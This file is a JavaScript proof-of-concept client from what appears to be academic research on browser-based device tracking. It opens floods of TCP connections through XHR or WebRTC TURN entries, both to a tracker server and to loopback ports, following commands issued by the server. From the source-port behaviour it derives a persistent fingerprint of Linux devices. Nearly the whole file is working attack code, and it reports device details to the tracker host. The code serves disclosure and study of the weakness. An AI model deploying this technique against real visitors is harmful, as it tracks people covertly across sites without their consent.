/*
 * Copyright (c) 2022 Moshe Kol, Amit Klein and Yossi Gilad
 * Available under MIT License
*/
const CLIENT_VERSION_MAJOR = 1;
const CLIENT_VERSION_MINOR = 1;

poc_log(`Client version: v${CLIENT_VERSION_MAJOR}.${CLIENT_VERSION_MINOR}`)

let batch_tcp_connect_func = batch_tcp_connect_xhr;
if (platform.name == "Chrome" || platform.name == "Chrome Mobile"){
    poc_log("Chrome browser detected");
    batch_tcp_connect_func = batch_tcp_connect_webrtc;
}

for (var os of ["windows", "os x", "ios"]) {
    if (platform.os.toString().toLowerCase().includes(os)) {
        document.getElementById("do_fingerprint_btn").disabled = true;
        poc_log("ERROR: Tracking can be made with Linux-based devices only");
        break;
    }
}

async function fill_in_form() {
    document.getElementById("browser").value = platform.name;
    document.getElementById("os").value = platform.os;
}

fill_in_form();

function tracker_address_select_onchange() {
    let select_tag = document.getElementById("tracker_address_select");
    let selected_option = select_tag.options[select_tag.selectedIndex];
    let tracker_address_input = document.getElementById("tracker_address");
    if (selected_option.text == "Custom") {
        tracker_address_input.value = "";
    } else if (selected_option.text == "Self") {
        tracker_address_input.value = window.location.hostname;
    } else {
        tracker_address_input.value = selected_option.value;
    }
}

tracker_address_select_onchange();

const LOOPBACK_IPV4_ADDR = '127.0.0.1';

function poc_log(text) {
    let today = new Date();
    let date = `${today.getFullYear()}-${String(today.getMonth()+1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`;
    let time = `${String(today.getHours()).padStart(2, '0')}:${String(today.getMinutes()).padStart(2, '0')}:${String(today.getSeconds()).padStart(2, '0')},${String(today.getMilliseconds()).padStart(3,'0')}`;
    let elem = document.getElementById("poc_log");
    elem.innerText += `${date} ${time}  ${text}\n`;
    console.log(`${date} ${time}  ${text}\n`);
    elem.scrollTop = elem.scrollHeight;
}

function clear_poc_log() {
    let elem = document.getElementById("poc_log");
    elem.innerText = "";
}

function set_intersection(a, b) {
    return new Set([...a].filter(x => b.has(x)));
}

function set_union(a, b) {
    return new Set([...a, ...b]);
}

function set_length(a) {
    return a.size;
}

function randstring(length) {
    let result = "";
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function batch_tcp_connect_xhr(daddr, dports) {
    return new Promise((resolve, reject) => {
        let ready = 0;
        let onreadystatechange_cb = function() {
            if (this.readyState == 4) {
                ready++;
                if (ready == dports.length) {
                    resolve();
                }
            }
        };
        for (const dport of dports) {
            const xhr = new XMLHttpRequest();
            xhr.open("GET", `http://${daddr}:${dport}/${randstring(4)}`);
            xhr.onreadystatechange = onreadystatechange_cb;
            try {
                xhr.send();
            } catch (err) {
            }
        }
    });
    
}

function do_batch_tcp_connect_webrtc(host, dports) {
    return new Promise((resolve, reject) => {
        var pc;

        //compatibility for firefox and chrome (also for Samsung Internet Browser!)
        var RTCPeerConnection = window.RTCPeerConnection
                        || window.mozRTCPeerConnection
                        || window.webkitRTCPeerConnection;
        if (!RTCPeerConnection) {
            reject("ERROR: RTCPeerConnection is null");
        }
    
        try
        {
                var urls=[];
                for (const dport of dports)
                {
                    urls.push({urls: "turn:"+host+":"+dport+"?transport=tcp", credential: "foo", username: "bar"}); // in Windows, Chrome just opens tons of TCP connections to the same destination IP+port. But we can vary the port if needed.
                }
                //construct a new RTCPeerConnection
                pc = new RTCPeerConnection({iceServers: urls, iceCandidatePoolSize: 0});
    
                pc.onicecandidate = function (ice) {
                    if (ice.candidate == null) {
                        pc.close();
                        pc = null;
                        resolve();
                    }
                }
    
                //create a bogus data channel
                pc.createDataChannel("", { reliable: false});
    
                //create an offer sdp
                pc.createOffer().then(function(offer) {
                    return pc.setLocalDescription(offer);
                }).catch(function(reason) {
                    reject("createOffer error: " + reason);
                })
        }
        catch (e)
        {
            reject(e.message);
        }
    });
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function batch_tcp_connect_webrtc(daddr, dports) {
    return Promise.race([do_batch_tcp_connect_webrtc(daddr, dports),sleep(1)]);
}

function batch_tcp_connect(daddr, dports) {
    poc_log(`> connecting to ${daddr} with ${dports.length} ports`);
    return batch_tcp_connect_func(daddr, dports);
}


async function fingerprint_device(tracker_address, tester_name, isp, location, note, browser, os, device_description, network_description) {
    let response = await fetch(`http://${tracker_address}/new_session?tester_name=${encodeURIComponent(tester_name)}&isp=${encodeURIComponent(isp)}&location=${encodeURIComponent(location)}&note=${encodeURIComponent(note)}&browser=${encodeURIComponent(browser)}&os=${encodeURIComponent(os)}&device_description=${encodeURIComponent(device_description)}&network_description=${encodeURIComponent(network_description)}&client_version=${encodeURIComponent(`v${CLIENT_VERSION_MAJOR}.${CLIENT_VERSION_MINOR}.js`)}`);
    if (!response.ok) {
        poc_log("failed to start new session for client");
        return null;
    }
    let response_json = await response.json();
    const id = response_json["id"];
    let unique_ports = null;
    poc_log(`client id = ${id}`);
    while (true) {
        response = await fetch(`http://${tracker_address}/next_command?id=${id}`);
        if (!response.ok) {
            poc_log("failed to fetch next command");
            return null;
        }
        response_json = await response.json();
        const command = response_json["command"];
        const data = response_json["data"];
        if (command == "error") {
            poc_log(`ERROR: ${data}`);
            return null;
        }
        var props;
        if (command == "summary-info") {
            props = JSON.parse(data);
            poc_log("--------------------------------------------");
            poc_log(`total duration: ${props["total_duration"]}`)
            poc_log(`phase1 duration: ${props["phase1_duration"]}`)
            poc_log(`phase1 iterations: ${props["phase1_iterations"]}`)
            poc_log(`phase2 duration: ${props["phase2_duration"]}`)
            poc_log(`phase2 iterations: ${props["phase2_iterations"]}`)
            poc_log(`source port range (configured): [${props["source_port_range_lo"]}, ${props["source_port_range_hi"]})`)
            poc_log(`source port range (observed): [${props["source_port_range_min"]}, ${props["source_port_range_max"]}]`)
            poc_log(`fingerprint: ${props["fingerprint"]}`)
            poc_log(`fingerprint hash: ${props["fingerprint_hash"]}`)
            return props["fingerprint"];
        } else {
            props = Object.fromEntries(data.split(";").map(kv_str => kv_str.split('=')));
        }
        if (command == "store-fingerprint") {
            poc_log(`fingerprint hash = ${props["fingerprint_hash"].slice(0,8)}`)
            return props["fingerprint"];
        }
        const ports = props["ports"].split(',').map(p => parseInt(p));
        if (command == "do-double-batch") {
            let prev_unique = [];
            if (props["unique_ports"]) {
               prev_unique = props["unique_ports"].split(',').map(p => parseInt(p));
            }
            poc_log(`${command}: ${ports.length + prev_unique.length} ports (prev unique ${prev_unique.length})`);
            if (batch_tcp_connect_func == batch_tcp_connect_xhr) {
                await batch_tcp_connect(tracker_address, ports);
                if (prev_unique.length > 0) {
                    await batch_tcp_connect(tracker_address, prev_unique);
                }
                await batch_tcp_connect(tracker_address, ports);
            } else {
                await batch_tcp_connect(tracker_address, [...ports, ...prev_unique, ...ports]);
            }
        } else if (command == "store-unique-ports") {
            poc_log(`${command}: ${ports.length} ports`);
            unique_ports = ports;
        } else if (command == "do-loopback-sandwich") {
            const ntries = parseInt(props["ntries"]);
            const sandwich_size = parseInt(props["sandwich_size"]);
            poc_log(`${command}: ${ports.length} loopback ports (ntries = ${ntries}, sandwich_size = ${sandwich_size})`);
            await batch_tcp_connect(tracker_address, unique_ports);
            for (let i = 0; i < ports.length; i += sandwich_size) {
                let loopback_dports = [];
                for (let offset = 0; offset < sandwich_size; offset++) {
                    if (i + offset >= ports.length) {
                        break
                    }
                    const tries = (1<<offset)*ntries;
                    poc_log(`loopback port ${ports[i+offset]} (tries = ${tries})`);
                    for (let k = 0; k < tries; k++) {
                        loopback_dports.push(ports[i+offset])
                    }
                }
                for (let j = 0; j < loopback_dports.length; j += 1000) {
                    await batch_tcp_connect(LOOPBACK_IPV4_ADDR, loopback_dports.slice(j,j+1000));
                }
                await batch_tcp_connect(tracker_address, unique_ports);
            }
            poc_log(`${command}: done`);
        }
    }

    return null;
}

function do_fingerprint() {
    clear_poc_log();
    let tracker_address = document.getElementById("tracker_address").value;
    if (tracker_address == "") {
        poc_log("Missing tracker address");
        return;
    }
    let tester_name = "tester";
    let isp = "local";
    let location = "local";
    let browser = document.getElementById("browser").value;
    if (browser == "") {
        poc_log("Missing browser");
        return;
    }
    let os = document.getElementById("os").value;
    if (os == "") {
        poc_log("Missing operating system");
        return;
    }
    let device_description = "";
    let network_description = "";
    let note = "";
    fingerprint_device(tracker_address, tester_name, isp, location, note, browser, os, device_description, network_description).then((fingerprint) => {
        if (fingerprint == null) {
            poc_log("failed to produce fingerprint");
            return;
        }
    });
}
